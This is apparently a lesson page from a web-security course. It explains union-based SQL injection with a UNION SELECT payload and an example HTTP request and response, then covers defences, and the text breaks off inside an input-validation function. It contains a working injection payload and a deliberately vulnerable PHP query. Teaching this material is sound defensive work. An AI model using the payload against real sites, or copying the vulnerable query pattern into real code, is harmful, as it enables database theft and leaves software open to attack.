---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Union-Based SQL Injection

Union-based SQL Injection is another in-band SQL Injection technique that allows an attacker to retrieve data from the database by appending a UNION SELECT statement to the original query. This method is effective when the attacker knows the structure of the database and can craft a query that returns additional data.

### How to Exploit Union-Based SQL Injection

To exploit union-based SQL Injection, the attacker needs to append a UNION SELECT statement to the original query. This requires knowledge of the number of columns returned by the original query and the ability to match the data types of the columns.

#### Example Scenario

Consider a web application with a search feature that queries a database based on user input. The SQL query might look like this:

```sql
SELECT product_id, product_name FROM products WHERE product_name = 'input_name';
```

An attacker can inject a UNION SELECT statement to retrieve additional data:

```sql
SELECT product_id, product_name FROM products WHERE product_name = 'input_name' UNION SELECT 1, table_name FROM information_schema.tables;
```

This will return the product ID and name along with the table names from the `information_schema`.

#### Full HTTP Request and Response

Here is an example of a full HTTP request and response:

**HTTP Request:**

```http
GET /search?name=input_name' UNION SELECT 1, table_name FROM information_schema.tables;-- HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
```

**HTTP Response:**

```http
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 224
Content-Type: text/html; charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>Search Results</title>
</head><body>
<h1>Search Results</h1>
<table>
<tr><th>ID</th><th>Name</th></tr>
<tr><td>1</td><td>products</td></tr>
<tr><td>2</td><td>users</td></tr>
<tr><td>3</td><td>orders</td></tr>
</table>
</body></html>
```

In this example, the attacker successfully retrieved the table names from the `information_schema`.

### How to Prevent / Defend Against Union-Based SQL Injection

#### Secure Coding Practices

1. **Use Parameterized Queries**: Ensure that all user inputs are passed as parameters to the SQL query, rather than being concatenated into the query string.
   
   **Vulnerable Code:**

   ```php
   $query = "SELECT product_id, product_name FROM products WHERE product_name = '" . $_GET['name'] . "'";
   ```

   **Secure Code:**

   ```php
   $stmt = $pdo->prepare("SELECT product_id, product_name FROM products WHERE product_name = :name");
   $stmt->execute(['name' => $_GET['name']]);
   ```

2. **Input Validation**: Validate and sanitize all user inputs to ensure they conform to expected formats.

   **Example:**

   ```php
   function validateName($name) {
       return preg_match('/^[a-zA-Z0-9_ ]+$/', $
```

---
<!-- nav -->
[[17-Understanding SQL Injection|Understanding SQL Injection]] | [[Web Security (PortSwigger)/02-SQL Injection/01-SQL Injection Complete Guide/00-Overview|Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/01-SQL Injection Complete Guide/19-Conclusion|Conclusion]]
